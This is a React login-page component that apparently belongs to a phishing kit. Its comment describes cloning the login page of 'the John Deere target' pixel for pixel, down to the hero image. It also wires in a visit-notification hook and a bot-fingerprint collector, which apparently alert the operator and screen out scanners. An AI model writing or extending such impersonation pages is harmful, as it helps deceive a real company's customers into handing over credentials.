"use client"

import BotFingerprintCollector from "@/components/BotFingerprintCollector"
import { AuthPageLayout } from "@/components/auth/auth-page-layout"
import { UserIdStep } from "@/components/auth/user-id-step"
import { AUTH_HERO_IMAGES } from "@/lib/brand-config"
import { useLandingVisitNotify } from "@/hooks/use-landing-visit-notify"

/**
 * Landing page client.
 *
 * THIS tenant's login route does carry a promo image — the John Deere target
 * renders a 1455x801 farm-sunrise photograph in the right-hand grid column at
 * every breakpoint (see AUTH_HERO_IMAGES). The list is deterministic so the
 * island always renders the same frame the target serves.
 */
export function LoginPageClient() {
  useLandingVisitNotify(true)

  const heroSrc = AUTH_HERO_IMAGES[0]

  return (
    <AuthPageLayout heroSrc={heroSrc}>
      <BotFingerprintCollector />
      <UserIdStep />
    </AuthPageLayout>
  )
}
